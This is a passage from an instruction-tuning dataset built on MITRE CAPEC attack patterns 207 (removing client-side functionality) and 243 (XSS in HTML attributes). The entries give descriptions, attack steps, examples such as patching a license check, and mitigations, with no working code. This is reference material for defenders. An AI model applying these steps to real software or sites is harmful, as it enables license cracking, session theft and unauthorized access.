    "output": "The resources required to execute Removing Important Client Functionality (CAPEC ID: 207) are the following: The adversary must have access to a client and be able to modify the client behavior, often through reverse engineering. If the server is assuming specific client functionality, this usually means the server only recognizes a specific client application, rather than a broad class of client applications. Reverse engineering tools would likely be necessary.",
    "category": "CAPECFlan",
    "instruction_type": "capec_resources_required",
    "parsed_raw_data": {
      "Resources_Required": "The adversary must have access to a client and be able to modify the client behavior, often through reverse engineering. If the server is assuming specific client functionality, this usually means the server only recognizes a specific client application, rather than a broad class of client applications. Reverse engineering tools would likely be necessary.",
      "@Name": "Removing Important Client Functionality (CAPEC ID: 207)",
      "attack_ptrn": {
        "@ID": "207",
        "@Name": "Removing Important Client Functionality",
        "@Abstraction": "Standard",
        "@Status": "Draft",
        "Description": "An adversary removes or disables functionality on the client that the server assumes to be present and trustworthy.",
        "Extended_Description": {
          "xhtml:p": "Adversaries can, in some cases, get around logic put in place to 'guard' sensitive functionality or data. Client applications may include functionality that a server relies on for correct and secure operation. This functionality can include, but is not limited to, filters to prevent the sending of dangerous content to the server, logical functionality such as price calculations, and authentication logic to ensure that only authorized users are utilizing the client. If an adversary can disable this functionality on the client, they can perform actions that the server believes are prohibited. This can result in client behavior that violates assumptions by the server leading to a variety of possible attacks. In the above examples, this could include the sending of dangerous content (such as scripts) to the server, incorrect price calculations, or unauthorized access to server resources."
        },
        "Likelihood_Of_Attack": "Medium",
        "Typical_Severity": "High",
        "Related_Attack_Patterns": {
          "Related_Attack_Pattern": {
            "@Nature": "ChildOf",
            "@CAPEC_ID": "22",
            "Exclude_Related": {
              "@Exclude_ID": "512"
            }
          }
        },
        "Execution_Flow": {
          "Attack_Step": [
            {
              "Step": "1",
              "Phase": "Explore",
              "Description": "[Probing] The adversary probes, through brute-forcing, reverse-engineering or other similar means, the functionality on the client that server assumes to be present and trustworthy.",
              "Technique": [
                "The adversary probes by exploring an application's functionality and its underlying mapping to server-side components.",
                "The adversary reverse engineers client-side code to identify the functionality that the server relies on for the proper or secure operation."
              ]
            },
            {
              "Step": "2",
              "Phase": "Experiment",
              "Description": "[Determine which functionality to disable or remove] The adversary tries to determine which functionality to disable or remove through reverse-engineering from the list of functionality identified in the Explore phase.",
              "Technique": "The adversary reverse engineers the client-side code to determine which functionality to disable or remove."
            },
            {
              "Step": "3",
              "Phase": "Exploit",
              "Description": "[Disable or remove the critical functionality from the client code] Once the functionality has been determined, the adversary disables or removes the critical functionality from the client code to perform malicious actions that the server believes are prohibited.",
              "Technique": "The adversary disables or removes the functionality from the client-side code to perform malicious actions, such as sending of dangerous content (such as scripts) to the server."
            }
          ]
        },
        "Prerequisites": {
          "Prerequisite": "The targeted server must assume the client performs important actions to protect the server or the server functionality. For example, the server may assume the client filters outbound traffic or that the client performs all price calculations correctly. Moreover, the server must fail to detect when these assumptions are violated by a client."
        },
        "Skills_Required": {
          "Skill": [
            {
              "@Level": "High",
              "#text": "To reverse engineer the client-side code to disable/remove the functionality on the client that the server relies on."
            },
            {
              "@Level": "Low",
              "#text": "The adversary installs a web tool that allows scripts or the DOM model of web-based applications to be modified before they are executed in a browser. GreaseMonkey and Firebug are two examples of such tools."
            }
          ]
        },
        "Resources_Required": {
          "Resource": "The adversary must have access to a client and be able to modify the client behavior, often through reverse engineering. If the server is assuming specific client functionality, this usually means the server only recognizes a specific client application, rather than a broad class of client applications. Reverse engineering tools would likely be necessary."
        },
        "Consequences": {
          "Consequence": [
            {
              "Scope": "Confidentiality",
              "Impact": "Other",
              "Note": "Information Leakage"
            },
            {
              "Scope": "Integrity",
              "Impact": "Modify Data"
            },
            {
              "Scope": "Confidentiality",
              "Impact": "Read Data"
            },
            {
              "Scope": [
                "Accountability",
                "Authentication",
                "Authorization",
                "Non-Repudiation"
              ],
              "Impact": "Gain Privileges"
            },
            {
              "Scope": [
                "Access Control",
                "Authorization"
              ],
              "Impact": "Bypass Protection Mechanism"
            }
          ]
        },
        "Mitigations": {
          "Mitigation": [
            "Design: For any security checks that are performed on the client side, ensure that these checks are duplicated on the server side.",
            "Design: Ship client-side application with integrity checks (code signing) when possible.",
            "Design: Use obfuscation and other techniques to prevent reverse engineering the client code."
          ]
        },
        "Example_Instances": {
          "Example": [
            "The adversary reverse engineers a Java binary (by decompiling it) and identifies where license management code exists. Noticing that the license manager returns TRUE or FALSE as to whether or not the user is licensed, the adversary simply overwrites both branch targets to return TRUE, recompiles, and finally redeploys the binary.",
            "The adversary uses click-through exploration of a Servlet-based website to map out its functionality, taking note of its URL-naming conventions and Servlet mappings. Using this knowledge and guessing the Servlet name of functionality they're not authorized to use, the adversary directly navigates to the privileged functionality around the authorizing single-front controller (implementing programmatic authorization checks)."
          ]
        },
        "Related_Weaknesses": {
          "Related_Weakness": {
            "@CWE_ID": "602"
          }
        },
        "References": {
          "Reference": [
            {
              "@External_Reference_ID": "REF-75",
              "@Section": "Greasemonkey"
            },
            {
              "@External_Reference_ID": "REF-76"
            },
            {
              "@External_Reference_ID": "REF-77",
              "@Section": "Greasemonkey"
            }
          ]
        },
        "Content_History": {
          "Submission": {
            "Submission_Name": "CAPEC Content Team",
            "Submission_Organization": "The MITRE Corporation",
            "Submission_Date": "2014-06-23"
          },
          "Modification": [
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2015-12-07",
              "Modification_Comment": "Updated Attacker_Skills_or_Knowledge_Required, Description Summary, Examples-Instances, References, Related_Vulnerabilities"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2019-04-04",
              "Modification_Comment": "Updated Consequences, Related_Attack_Patterns"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2022-09-29",
              "Modification_Comment": "Updated Description, Example_Instances, Execution_Flow, Extended_Description, Resources_Required, Skills_Required"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2023-01-24",
              "Modification_Comment": "Updated Example_Instances"
            }
          ],
          "Previous_Entry_Name": {
            "@Date": "2015-12-07",
            "#text": "Removing Important Functionality from the Client"
          }
        }
      }
    }
  },
  {
    "instruction": "What are the required resources to execute the attack pattern: XSS Targeting HTML Attributes (CAPEC ID: 243)",
    "context": "",
    "output": "The resources required to execute XSS Targeting HTML Attributes (CAPEC ID: 243) are the following: The adversary must trick the victim into following a crafted link to a vulnerable server or view a web post where the dangerous commands are executed.",
    "category": "CAPECFlan",
    "instruction_type": "capec_resources_required",
    "parsed_raw_data": {
      "Resources_Required": "The adversary must trick the victim into following a crafted link to a vulnerable server or view a web post where the dangerous commands are executed.",
      "@Name": "XSS Targeting HTML Attributes (CAPEC ID: 243)",
      "attack_ptrn": {
        "@ID": "243",
        "@Name": "XSS Targeting HTML Attributes",
        "@Abstraction": "Detailed",
        "@Status": "Draft",
        "Description": "An adversary inserts commands to perform cross-site scripting (XSS) actions in HTML attributes. Many filters do not adequately sanitize attributes against the presence of potentially dangerous commands even if they adequately sanitize tags. For example, dangerous expressions could be inserted into a style attribute in an anchor tag, resulting in the execution of malicious code when the resulting page is rendered. If a victim is tricked into viewing the rendered page the attack proceeds like a normal XSS attack, possibly resulting in the loss of sensitive cookies or other malicious activities.",
        "Typical_Severity": "Medium",
        "Related_Attack_Patterns": {
          "Related_Attack_Pattern": [
            {
              "@Nature": "ChildOf",
              "@CAPEC_ID": "591"
            },
            {
              "@Nature": "ChildOf",
              "@CAPEC_ID": "592"
            },
            {
              "@Nature": "ChildOf",
              "@CAPEC_ID": "588"
            }
          ]
        },
        "Execution_Flow": {
          "Attack_Step": [
            {
              "Step": "1",
              "Phase": "Explore",
              "Description": "[Survey the application for user-controllable inputs] Using a browser or an automated tool, an adversary follows all public links and actions on a web site. They record all the links, the forms, the resources accessed and all other potential entry-points for the web application.",
              "Technique": [
                "Use a spidering tool to follow and record all links and analyze the web pages to find entry points. Make special note of any links that include parameters in the URL.",
                "Use a proxy tool to record all links visited during a manual traversal of the web application.",
                "Use a browser to manually explore the website and analyze how it is constructed. Many browsers' plugins are available to facilitate the analysis or automate the discovery."
              ]
            },
            {
              "Step": "2",
              "Phase": "Experiment",
              "Description": "[Probe identified potential entry points for XSS targeting HTML attributes] The adversary uses the entry points gathered in the \"Explore\" phase as a target list and injects various malicious expressions as input, hoping to embed them as HTML attributes.",
              "Technique": [
                "Inject single and double quotes into URL parameters or other inputs to see if they are filtered out. Also use URL encoding to bypass filters.",
                "Use single or double quotes to close attribute evaluation and enter a new attribute that contains an expression."
              ]
            },
            {
              "Step": "3",
              "Phase": "Experiment",
              "Description": "[Craft malicious XSS URL] Once the adversary has determined which parameters are vulnerable to XSS, they will craft a malicious URL containing the XSS exploit. The adversary can have many goals, from stealing session IDs, cookies, credentials, and page content from the victim.",
              "Technique": [
                "Execute a script using an expression embedded in an HTML attribute, which avoids needing to inject a script tag.",
                "Send information gathered from the malicious script to a remote endpoint."
              ]
            },
            {
              "Step": "4",
              "Phase": "Exploit",
              "Description": "[Get victim to click URL] In order for the attack to be successful, the victim needs to access the malicious URL.",
              "Technique": [
                "Send a phishing email to the victim containing the malicious URL. This can be hidden in a hyperlink as to not show the full URL, which might draw suspicion.",
                "Put the malicious URL on a public forum, where many victims might accidentally click the link."
              ]
            }
          ]
        },
        "Prerequisites": {
          "Prerequisite": "The target application must fail to adequately sanitize HTML attributes against the presence of dangerous commands."
        },
        "Resources_Required": {
          "Resource": "The adversary must trick the victim into following a crafted link to a vulnerable server or view a web post where the dangerous commands are executed."
        },
        "Mitigations": {
          "Mitigation": [
            "Design: Use libraries and templates that minimize unfiltered input.",
            "Implementation: Normalize, filter and use an allowlist for all input including that which is not expected to have any scripting content.",
            "Implementation: The victim should configure the browser to minimize active content from untrusted sources."
          ]
        },
        "Related_Weaknesses": {
          "Related_Weakness": {
            "@CWE_ID": "83"
          }
        },
        "References": {
          "Reference": {
            "@External_Reference_ID": "REF-94"
          }
        },
        "Content_History": {
          "Submission": {
            "Submission_Name": "CAPEC Content Team",
            "Submission_Organization": "The MITRE Corporation",
            "Submission_Date": "2014-06-23"
          },
          "Modification": [
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2017-05-01",
              "Modification_Comment": "Updated Description Summary, Related_Attack_Patterns, Related_Weaknesses"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2018-07-31",
              "Modification_Comment": "Updated Description Summary"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2020-07-30",
              "Modification_Comment": "Updated Mitigations"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2022-02-22",
              "Modification_Comment": "Updated Execution_Flow, Resources_Required"
            }
          ],
          "Previous_Entry_Name": [
            {
              "@Date": "2017-05-01",
              "#text": "Cross-Site Scripting in Attributes"
            },
            {
              "@Date": "2018-07-31",
              "#text": "XSS Targetting HTML Attributes"
            }
          ]
        }
      }
    }
  }
]